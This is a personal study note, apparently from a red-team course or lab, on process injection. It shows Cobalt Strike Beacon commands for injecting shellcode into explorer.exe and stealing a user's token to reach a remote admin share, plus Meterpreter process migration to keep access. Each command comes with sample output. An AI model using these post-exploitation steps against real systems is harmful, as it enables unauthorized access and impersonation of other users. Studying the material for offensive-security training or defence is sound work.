---
creation date: September 23rd 2022
last modified date: September 23rd 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Process Injection]]  
___

## Description:  

### In Cobalt Strike

The `inject` command will inject a Beacon payload in the form of shellcode into a target process. You can inject into processes owned by the current user without needing elevation, but local admin privileges are required to inject into processes owned by other users. If you inject into a process owned by a different user, your Beacon will run with all the local and domain privileges of that user.


```
beacon> ps

PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
448   796   RuntimeBroker.exe            x64   1           DEV\jking
2496  716   svchost.exe                  x64   1           DEV\jking
2948  1200  sihost.exe                   x64   1           DEV\jking
3088  1200  taskhostw.exe                x64   1           DEV\jking
3320  3304  explorer.exe                 x64   1           DEV\jking
3608  796   ShellExperienceHost.exe      x64   1           DEV\jking
3800  796   SearchUI.exe                 x64   1           DEV\jking
4004  3320  shutdown.exe                 x64   1           DEV\jking
4016  4004  conhost.exe                  x64   1           DEV\jking
4472  1200  taskhostw.exe                x64   1           DEV\jking

beacon> inject 3320 x64 tcp-4444-local
[+] established link to child beacon: 10.10.17.231

```


The `steal_token` command will impersonate the access token of the target process. Like `make_token`, it's good for access resources across a network but not local actions. Use `rev2self` to drop the impersonation. This command opens a handle to the target process in order to duplicate and impersonate the access token, and therefore requires local admin privileges.

```
beacon> ls \\srv-2\c$
[-] could not open \\srv-2\c$\*: 5

beacon> steal_token 3320
[+] Impersonated DEV\jking

beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/23/2021 17:08:43   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/17/2021 18:28:36   System Volume Information
          dir     02/17/2021 18:32:08   Users
          dir     02/17/2021 18:28:54   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 256mb    fil     03/04/2021 10:12:52   pagefile.sys

beacon> rev2self
[*] Tasked beacon to revert token
[+] host called home, sent: 20 bytes

```

### In Metasploit

When we compromise a host, our meterpreter payload is executed inside the process of the 
application we attack. If the victim closes that process, our access to the machine is closed as well.

```
meterpreter > ps

meterpreter > migrate 3568
[*] Migrating from 3164 to 3568...
[*] Migration completed successfully.
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 23rd 2022 (05:43 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
